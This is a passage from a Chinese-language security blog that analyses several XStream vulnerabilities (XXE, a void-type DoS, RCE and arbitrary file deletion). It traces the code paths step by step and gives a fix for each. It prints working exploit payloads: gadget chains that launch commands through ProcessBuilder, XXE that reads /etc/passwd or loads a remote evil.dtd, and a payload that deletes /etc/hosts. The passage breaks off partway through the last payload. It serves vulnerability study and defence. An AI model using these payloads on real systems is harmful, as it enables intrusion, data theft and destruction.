class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用的还是TreeMap，同样还是在TreeMapConverter#populateTreeMap方法中：</p>
<p>区别在于第一个POC走如下路线（动态代理dynamic-proxy处在第一个子标签，他直接通过if放入了sortedMap）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072303349.png" alt="image-20230407230330282"></p>
<p>第二个POC走如下路线（动态代理dynamic-proxy处在第二个子标签，他要进入populateMap方法才放入sortedMap）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072304216.png" alt="image-20230407230420645"></p>
<p>在populateMap方法中，判断是否有子标签，若还有子标签，则接着调用putCurrentEntryIntoMap方法找到读取子标签，找到对应的类并实例化，然后存放到sortedMap中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072304089.png" alt="image-20230407230452028"></p>
<p>后续调用result.putAll的流程和第一次差不多，也是提取sortedMap的所有对应的key和value，将key进行比对。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>注册一个自己的converter：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xstream.registerConverter(<span class="keyword">new</span> <span class="title class_">Converter</span>() &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConvert</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> type != <span class="literal">null</span> &amp;&amp; (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Unsupported type due to security reasons.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_LOW);</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2016-3674"><a href="#CVE-2016-3674" class="headerlink" title="CVE-2016-3674"></a>CVE-2016-3674</h2><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.8  且使用了如下解析器：</li>
<li>DOM4J</li>
<li>DOM</li>
<li>JDOM</li>
<li>JDOM2</li>
<li>StAX implementation</li>
<li>XOM</li>
</ul>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>XStream 支持许多不同的 XML 解析器。其中一些还可以处理默认启用的外部实体。因此，攻击者可以提供操纵的 XML 作为输入来访问文件系统上的数据。</p>
<p>这个很骚，官网给的POC用不了：</p>
<p>官网给的POC：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">  &lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT string (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY content SYSTEM <span class="string">&quot;file:/etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">]&gt;&lt;string&gt;&amp;content;&lt;/string&gt;</span></span><br></pre></td></tr></table></figure>

<p>报错，然后发现第一行的结束标签少了个问号，真是人才，官网这都能写错，修正后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">  &lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ELEMENT string (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY content SYSTEM &quot;file:/etc/passwd&quot;&gt;</span><br><span class="line">]&gt;&lt;string&gt;&amp;content;&lt;/string&gt;</span><br></pre></td></tr></table></figure>

<p>然后网上也没有该漏洞的分析文章，只能自己从0开始，在浅蓝的blog里也有POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">com.thoughtworks.xstream.io.xml.<span class="type">DomDriver</span> <span class="variable">domDriver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.thoughtworks.xstream.io.xml.DomDriver();</span><br><span class="line"><span class="type">String</span> <span class="variable">x</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;\n&quot;</span> +</span><br><span class="line">           <span class="string">&quot;&lt;!ENTITY  % xxe SYSTEM \&quot;http://127.0.0.1:2333/evil.dtd\&quot; &gt;\n&quot;</span> +</span><br><span class="line">           <span class="string">&quot;%xxe;]&gt;\n&quot;</span> +</span><br><span class="line">           <span class="string">&quot;&lt;foo&gt;1&lt;/foo&gt;&quot;</span>;</span><br><span class="line">domDriver.createReader(<span class="keyword">new</span> <span class="title class_">StringReader</span>(x));</span><br></pre></td></tr></table></figure>

<p>在我所使用的1.4.8版本中，只有DomDriver解析器是可以触发POC的，其他的都不行（一些解析器不支持解析外部实体，一些解析默认不开启外部实体支持）。</p>
<p>一眼顶真，在DomDriver的createReader方法中，未设置不允许外部实体，造成了XXE。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081429853.png" alt="image-20230408142931739"></p>
<p>对于DocumentBuilder来说，在解析xml使应开启安全配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">DocumentBuilder db = dbf.newDocumentBuilder();</span><br></pre></td></tr></table></figure>

<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>使用其他解析器，如果使用默认的 XML Pull Parser（Xpp3 或 kXML2），XStream 不会受到攻击，因为这些解析器类型根本不处理 XML 实体。</p>
<h2 id="CVE-2017-7957"><a href="#CVE-2017-7957" class="headerlink" title="CVE-2017-7957"></a>CVE-2017-7957</h2><h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.9</li>
</ul>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>使用void类型时，会造成DOS攻击。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081451960.png" alt="image-20230408145137904"></p>
<p>会为基本类型void分配实例。</p>
<p>这其实是jdk8的一个bug，jdk8中的Unsafe.allocateInstance(Class&lt;?&gt; cls)不支持分配基础数据类型。</p>
<p>对于基本数据类型来说，例如int.class。</p>
<p>他会获取Integer的Type，然后通过Class.getPrimitiveClass(“int”);拿到Type的值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081534680.png" alt="image-20230408153413618"></p>
<p>getPrimitiveClass是个native方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081535905.png" alt="image-20230408153507873"></p>
<p>在jvm层面调用的是<code>JVM_FindPrimitiveClass</code>方法，这个方法其实是从<code>static oop _mirrors[T_VOID+1];</code>缓存里取出一个 oop对象。</p>
<p>我们都知道在jvm里是通过klass&#x2F;oop来描述java里的类与对象的，每加载一个Java类，在jvm层面就会生成klass实例，每创建一个Java类对象时会生成一个oop实例，这个oop实例会持有一个klass指针。这里需要多说的一点是，在Java语言层面用Class来代表每一个类，所以在加载每一个Java类时除了会生成klass实例外，还会创建一个Class类对象即jvm里的oop对象，该对象同样会有一个指针指向对应的klass, 访问Java层面的A.class时，在jvm层面就是访问这个oop对象。</p>
<p><code>static oop _mirrors[T_VOID+1];</code>缓存是在jvm初始化时初始化的，初始化的关键是调用<code>java_lang_Class::create_basic_type_mirror</code>方法，该方法逻辑比较简单，就是调用<code>Class_klass</code>的<code>allocate_instance</code>创建一个oop实例，<strong>但是这里有个关键点是：当创建基本数据类型时，没有传入具体的klass对象，而是传入的null</strong>，关键代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> oop java_class = InstanceMirrorKlass::<span class="built_in">cast</span>(SystemDictionary::<span class="built_in">Class_klass</span>())-&gt;<span class="built_in">allocate_instance</span>(<span class="literal">NULL</span>, CHECK_0);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般对象创建Class实例时的代码</span></span><br><span class="line">Handle mirror = InstanceMirrorKlass::<span class="built_in">cast</span>(SystemDictionary::<span class="built_in">Class_klass</span>())-&gt;<span class="built_in">allocate_instance</span>(k, CHECK);</span><br></pre></td></tr></table></figure>

<p>也就是说基本数据类型的oop对象没有klass指针，他们的klass指针为NULL！</p>
<p><code>UNSAFE.allocateInstance</code>的jvm代码<code>Unsafe_AllocateInstance</code>，该方法底层调用链是<code>jni_AllocObject</code>-&gt;<code>alloc_object</code>，alloc_object的方法入参为<code>jclass clazz</code>, 这个在java层面就是<code>int.class</code>，在jvm层面就是一个<code>class mirror oop</code>对象。在方法里，他会获取oop对象的klass指针，然后调用该指针所指向的对象的方法，但是该指针为空，所以就导致了空指针引用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 获取klass指针</span><br><span class="line">KlassHandle k(THREAD,</span><br><span class="line">java_lang_Class::as_Klass(JNIHandles::resolve_non_null(clazz)));</span><br><span class="line"></span><br><span class="line">// 出错代码，k()对于int.class类型（基础数据类型）返回值为NULL，导致调用空指针的方法</span><br><span class="line">// 可以理解为Java层面的NullPointerException</span><br><span class="line">k()-&gt;check_valid_for_instantiation(false, CHECK_NULL);</span><br><span class="line">InstanceKlass::cast(k())-&gt;initialize(CHECK_NULL);</span><br><span class="line">instanceOop ih = InstanceKlass::cast(k())-&gt;allocate_instance(THREAD);</span><br><span class="line">return ih;</span><br></pre></td></tr></table></figure>

<p>这就是JVM出错的根本原因了。</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>XStream 自 1.4.7 版起包含一个<a href="https://x-stream.github.io/security.html">安全框架</a>，以防止 CVE-2013-7285 中描述的攻击。如果这个框架被正确初始化，它也可以通过设置来抑制当前的漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.denyTypes(new Class[]&#123; void.class, Void.class &#125;);</span><br></pre></td></tr></table></figure>

<p>旧 XStream 版本的用户可以为void类型注册一个自己的Converter，这也可以防止这种攻击：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xstream.registerConverter(<span class="keyword">new</span> <span class="title class_">Converter</span>() &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConvert</span><span class="params">(Class type)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Void.class == type || <span class="keyword">void</span>.class == type;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Type void cannot have an instance&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;Type void cannot have an instance&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_VERY_HIGH);</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.13</li>
</ul>
<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>这次是CVE-2013-7285的变种，绕过了黑名单。</p>
<p>在1.4.7之后有了个安全框架，在调用MapperWrapper的realClass方法从Map中根据标签名寻找类时，会过滤一些黑名单，如图：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081616769.png" alt="image-20230408161634719"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081615934.png" alt="image-20230408161504878"></p>
<p>而这次官方给出的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">            &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">              &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">                &lt;iterator class=&#x27;javax.imageio.spi.FilterIterator&#x27;&gt;</span><br><span class="line">                  &lt;iter class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                    &lt;cursor&gt;0&lt;/cursor&gt;</span><br><span class="line">                    &lt;lastRet&gt;-1&lt;/lastRet&gt;</span><br><span class="line">                    &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">                    &lt;outer-class&gt;</span><br><span class="line">                      &lt;java.lang.ProcessBuilder&gt;</span><br><span class="line">                        &lt;command&gt;</span><br><span class="line">                          &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">                        &lt;/command&gt;</span><br><span class="line">                      &lt;/java.lang.ProcessBuilder&gt;</span><br><span class="line">                    &lt;/outer-class&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next/&gt;</span><br><span class="line">                &lt;/iterator&gt;</span><br><span class="line">                &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">              &lt;/e&gt;</span><br><span class="line">              &lt;in class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">                &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">                &lt;pos&gt;0&lt;/pos&gt;</span><br><span class="line">                &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">                &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">              &lt;/in&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>有些没必要的属性可以不用赋值，删减后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;</span><br><span class="line">              &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;</span><br><span class="line">                &lt;iterator class=&#x27;javax.imageio.spi.FilterIterator&#x27;&gt;</span><br><span class="line">                  &lt;iter class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                    &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">                    &lt;outer-class&gt;</span><br><span class="line">                      &lt;java.lang.ProcessBuilder&gt;</span><br><span class="line">                        &lt;command&gt;</span><br><span class="line">                          &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">                        &lt;/command&gt;</span><br><span class="line">                      &lt;/java.lang.ProcessBuilder&gt;</span><br><span class="line">                    &lt;/outer-class&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  &lt;next/&gt;</span><br><span class="line">                &lt;/iterator&gt;</span><br><span class="line">                &lt;type&gt;KEYS&lt;/type&gt;</span><br><span class="line">              &lt;/e&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>层层赋值~，Map内部使用entry作为数据结构，entry里就存着key和value，每一个entry代表一个键值对，POC中的键为jdk.nashorn.internal.objects.NativeString类实例，值为test字符串。还要提一嘴这个outer-class标签，当存在非静态内部类时，他会持有一个外部类的实例，outer-class标签就是代表持有的这个外部类的实例。举个例子：对于ArrayList$Itr来说，他有一个非静态内部类Itr：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081730633.png" alt="image-20230408173052550"></p>
<p>而这个非静态内部类Itr，为了能使用外部类（也就是ArrayList）的属性和方法，他会持有一个外部类的实例，也就是this$0（非静态内部类的属性名，值为外部类的实例）。而在XStream中，outer-class标签代表的就是外部类的实例，也就是this$0。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081733591.png" alt="image-20230408173303519"></p>
<p>而在POC中，我们指定了outer-class标签，他代表外部类的实例（ArrayList），然后子标签为java.lang.ProcessBuilder，则表示往ArrayList存入java.lang.ProcessBuilder对象。</p>
<p>这个POC的序列化过程如下：</p>
<ol>
<li>创建HashMap，键为NativeString类的实例，值为test字符串；</li>
<li>为NativeString类的实例的value属性赋值，由于value属性需要一个CharSequence类的实例，而POC指定的类为Base64Data为CharSequence类的子类，会实例化Base64Data类，然后为他的dataHandler属性赋值；</li>
<li>他的dataHandler属性的类型DataHandler，然后就是实例化DataHandler类，然后为他的属性dataSource赋值；</li>
<li>dataSource我们指定了为XmlDataSource类型，然后他会实例化XmlDataSource类，为他的is属性赋值；</li>
<li>is属性我们指定了为SequenceInputStream类型，然后他会实例化SequenceInputStream类，为他的e属性赋值；</li>
<li>e属性我们指定了为MultiUIDefaultsEnumerator类型，然后他会实例化MultiUIDefaultsEnumerator类，为他的iterator和type属性赋值；</li>
<li>type属性赋值为KEYS，iterator属性我们指定了为FilterIterator类型，然后他会实例化FilterIterator类，为他的iter、filter和next属性赋值；</li>
<li>next属性赋值为空，iter属性我们指定了为Itr类型，然后他会实例化Itr类，为他的expectedModCount和outer-class属性赋值；filter属性我们指定了为ContainsFilter类型，然后他会实例化ContainsFilter类，为他的method和name属性赋值；</li>
<li>expectedModCount属性赋值为1，outer-class属性为ArrayList类型，获取他的实例，然后存入java.lang.ProcessBuilder对象。method属性为Method类，也是创建实例，为他的属性class、name、parameter-types赋值，将name属性赋值为start。</li>
</ol>
<p>在MapConverter的unmarshal方法中，创建完map后往里面填充元素：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081828236.png" alt="image-20230408182843173"></p>
<p>从populateMap-&gt;populateMap重载，在重载里接着调用putCurrentEntryIntoMap将entry填充到map：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081831035.png" alt="image-20230408183114984"></p>
<p>在putCurrentEntryIntoMap方法里，调用HashMap的put方法将NativeString类实例和test字符串放入map：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081832744.png" alt="image-20230408183227686"></p>
<p>HashMap#put-&gt;HashMap#hash，调用key的hashCode方法，也就是NativeString类实例的hashCode方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081834004.png" alt="image-20230408183420944"></p>
<p>NativeString类实例的hashCode方法里，调用getStringValue方法，然后调用value属性的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081835990.png" alt="image-20230408183532944"></p>
<p>之前说过value属性赋值为Base64Data类实例，这时候调用就是Base64Data的toString方法，在toString方法里，又调用了get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081836040.png" alt="image-20230408183652991"></p>
<p>在get方法里，获取is属性，然后调用baos.readFrom(is);将SequenceInputStream传入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082024697.png" alt="image-20230408202417634"></p>
<p>使用传入的is（SequenceInputStream）进行读：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082026160.png" alt="image-20230408202614112"></p>
<p>在read方法里又调用了nextStream方法（我们未对in赋值，而是对e赋值为MultiUIDefaultsEnumerator类实例）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082027798.png" alt="image-20230408202707747"></p>
<p>nextStream方法里的第一步：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082034139.png" alt="image-20230408203441983"></p>
<p>nextStream方法的第二步：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082039896.png" alt="image-20230408203943833"></p>
<p>进入advance方法里查看，这里通过ArrayList$Itr获取ArrayList里的值，为之前存好的ProcessBuiler对象，然后调用filter的filter方法，filter为ContainsFilter类实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082041329.png" alt="image-20230408204116268"></p>
<p>在filter方法里执行命令并传入创建好的ProcessBuiler对象（封装了要执行的命令）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082044139.png" alt="image-20230408204420082"></p>
<p>最后在javax.imageio.ImageIO$ContainsFilter的filter方法执行了命令。</p>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>1.4.13版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot; &#125;); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.7~1.4.12版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot; &#125;); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.6版本及以下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xstream.registerConverter(new Converter() &#123;</span><br><span class="line">  public boolean canConvert(Class type) &#123;</span><br><span class="line">    return type != null &amp;&amp; (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || type == java.lang.Void.class || void.class || type.getName().equals(&quot;javax.imageio.ImageIO$ContainsFilter&quot;) || Proxy.isProxy(type));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_VERY_HIGH);</span><br></pre></td></tr></table></figure>

<p>最后发现一个有意思的东西，这个漏洞由国人挖的（太强了）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082054454.png" alt="image-20230408205415405"></p>
<h2 id="CVE-2020-26259"><a href="#CVE-2020-26259" class="headerlink" title="CVE-2020-26259"></a>CVE-2020-26259</h2><h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D;  1.4.14</li>
</ul>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会造成任意文件删除。</p>
<p>官网给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">            &lt;is class=&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;&gt;</span><br><span class="line">              &lt;tempFile&gt;/etc/hosts&lt;/tempFile&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    